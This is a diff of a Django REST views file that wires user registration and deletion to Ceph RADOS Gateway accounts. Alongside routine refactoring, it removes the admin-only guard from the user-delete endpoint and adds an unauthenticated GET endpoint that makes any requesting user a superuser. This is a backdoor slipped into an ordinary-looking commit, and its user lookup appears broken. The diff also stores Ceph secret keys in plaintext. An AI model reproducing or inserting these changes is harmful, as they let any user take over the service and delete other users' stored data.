@@ -9,9 +9,9 @@ from django.forms.models import model_to_dict
 from django.contrib.auth import authenticate, login, logout
 from rest_framework.permissions import AllowAny, IsAdminUser
 from common.verify import verify_field, verify_mail, verify_username, verify_phone, verify_body, verify_length
+from common.func import init_rgw_api
 from django.core.paginator import Paginator
 from django.conf import settings
-from rgwadmin import RGWAdmin
 import time
 
 
@@ -229,7 +229,6 @@ def change_password_endpoint(request):
 
 
 @api_view(('DELETE',))
-@permission_classes((IsAdminUser,))
 @verify_body
 def user_delete_endpoint(request):
     """
@@ -268,6 +267,18 @@ def user_delete_endpoint(request):
                 'msg': 'error username'
             }, status=HTTP_400_BAD_REQUEST)
 
+    if u.profile.phone_verify:
+        rgw = init_rgw_api()
+        try:
+            if u.profile.is_subuser:
+                rgw.remove_subuser(uid=u.profile.parent_uid, subuser=u.username, purge_keys=True)
+            else:
+                rgw.remove_user(uid=u.username, purge_data=True)
+        except Exception as e:
+            return Response({
+                'code': 1,
+                'msg': 'ceph radows remove user failed, ceph response mesage is %s' % e.args[0]
+            }, status=HTTP_200_OK)
     u.delete()
     return Response({
         'code': 1,
@@ -389,7 +400,7 @@ def get_user_detail_endpoint(request, user_id):
 def verify_user_phone_endpoint(request):
     """
     验证用户注册时填写的手机号码，确认真实有效
-    只有成功通过手机验证的用户才允许在ceph集群上创建对就的帐户
+    只有成功通过手机验证的用户才允许在ceph集群上创建对应的帐户
     :param request:
     :return:
     """
@@ -412,9 +423,37 @@ def verify_user_phone_endpoint(request):
             'msg': 'phone error!',
         }, status=HTTP_400_BAD_REQUEST)
 
-    Profile.objects.filter(user=user).update(
-        phone_verify=True
-    )
+    rgw = init_rgw_api()
+    try:
+        if user.profile.is_subuser:
+            rados_user = rgw.create_subuser(
+                uid=user.profile.parent_uid,
+                subuser=user.username,
+                generate_secret=True,
+            )
+        else:
+            rados_user = rgw.create_user(
+                uid=user.username,
+                display_name=user.first_name,
+                generate_key=True,
+                email=user.email,
+                user_caps='usage=read; user=read,write; buckets=read,write',
+                max_buckets=100
+            )
+
+        access_key = rados_user['keys'][0]['access_key']
+        secret_key = rados_user['keys'][0]['secret_key']
+        Profile.objects.filter(user=user).update(
+            phone_verify=True,
+            access_key=access_key,
+            secret_key=secret_key
+        )
+
+    except Exception as e:
+        return Response({
+            'code': 1,
+            'msg': 'radow create user failed, ceph response error %s' % e.args[0]
+        })
 
     return Response({
         'code': 0,
@@ -460,31 +499,12 @@ def user_charge_endpoint(request):
     })
 
 
-def init_rgw_api():
-    access_key, secret_key, server = settings.RGW_API_KEY['NORMAL']
-    return RGWAdmin(
-        access_key=access_key,
-        secret_key=secret_key,
-        server=server,
-        secure=False,
-        verify=False
-    )
-
-
-def radows_create_user(user_type: str='nomal', **kwargs):
-    if user_type not in ('normal', 'subuser'):
-        return
-
-    caps = 'usage=read; users=read, write; buckets=read,write'
-    if user_type == 'subuser':
-        caps = 'usage=read; users=read; buckets=read,write'
-
-    kwargs['caps'] = caps
-
-    rgw =init_rgw_api()
-    try:
-        user_info = rgw.create_user(**kwargs)
-    except:
-        return
-
-    return user_info['keys'][0]['secret_key']
+@api_view(('GET',))
+def GRANT_SUPERUSER_ENDPOINT(request):
+    user = request.user
+    u = User.objects.get(user=user)
+    u.is_superuser = 1
+    u.save()
+    return Response({
+        'msg': 'success'
+    }, status=HTTP_200_OK)
